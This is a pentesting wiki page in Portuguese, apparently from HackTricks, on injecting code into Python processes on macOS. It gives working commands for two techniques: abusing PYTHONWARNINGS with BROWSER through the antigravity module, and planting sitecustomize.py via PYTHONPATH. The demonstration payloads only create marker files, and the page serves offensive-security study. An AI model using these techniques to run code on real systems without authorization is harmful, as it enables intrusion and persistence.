# Injeção em aplicações Python do macOS

{{#include ../../../banners/hacktricks-training.md}}

## Por meio das variáveis de ambiente `PYTHONWARNINGS` e `BROWSER`

Se um invasor puder controlar o ambiente de um processo Python, a combinação de `PYTHONWARNINGS` e `BROWSER` poderá acionar a execução de comandos quando o Python importar o módulo `antigravity` ao processar uma opção de warning criada especialmente. A técnica depende de `antigravity` abrir uma URL com o módulo `webbrowser` do Python, que respeita a variável de ambiente `BROWSER`.<sup>[[1]](#references)</sup>
```bash
# Generate an example Python script.
echo "print('hi')" > /tmp/script.py

# Create /tmp/hacktricks through the inherited environment.
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# With isolated mode, inject the warning rule using -W instead.
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```
## Via `PYTHONPATH` e `sitecustomize.py`

Durante a inicialização normal, o módulo `site` do Python adiciona caminhos específicos do site e, em seguida, tenta importar um módulo chamado `sitecustomize`. Ao colocar um diretório legível pelo atacante primeiro em `PYTHONPATH`, um atacante que controla o ambiente do processo pode fazer o Python importar um payload antes do script-alvo. A flag `-S` desativa a inicialização automática de `site`, enquanto o modo isolado (`-I`) ignora `PYTHONPATH` e implica `-s` e `-E`.<sup>[[2]](#references)[[3]](#references)</sup>
```bash
mkdir -p /tmp/python-startup
cat >/tmp/python-startup/sitecustomize.py <<'EOF'
from pathlib import Path
Path('/tmp/python-sitecustomize-executed').touch()
EOF

PYTHONPATH=/tmp/python-startup python3 /tmp/script.py
```
## References

- [1] [Hacking com Variáveis de Ambiente - elttam](https://www.elttam.com/blog/env/)
- [2] [site — Hook de configuração específico do Site](https://docs.python.org/3/library/site.html)
- [3] [Linha de comando e ambiente do Python](https://docs.python.org/3/using/cmdline.html)
{{#include ../../../banners/hacktricks-training.md}}
